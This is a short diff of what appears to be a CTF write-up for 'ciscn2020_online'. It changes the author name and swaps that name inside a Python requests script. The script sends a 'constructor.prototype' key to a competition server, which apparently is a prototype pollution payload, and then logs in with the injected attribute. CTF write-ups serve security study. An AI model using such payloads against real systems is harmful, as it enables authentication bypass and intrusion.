@@ -1,6 +1,6 @@
 ---
 title: ciscn2020_online
-author: ch3n9w
+author: ch4ser
 date: 2020-08-20 13:16:50
 categories:
   - CTF
@@ -150,12 +150,12 @@ import requests
 url = "http://eci-2ze9505q64pi24hxhzqj.cloudeci1.ichunqiu.com:8888/"
 
 data1 = {
-    "NewAttributeKey":"constructor.prototype.ch3n9w",
+    "NewAttributeKey":"constructor.prototype.ch4ser",
     "NewAttributeValue":"1234"
 }
 
 data2 = {
-    "key":'ch3n9w',
+    "key":'ch4ser',
     'password':'1234'
 }
 
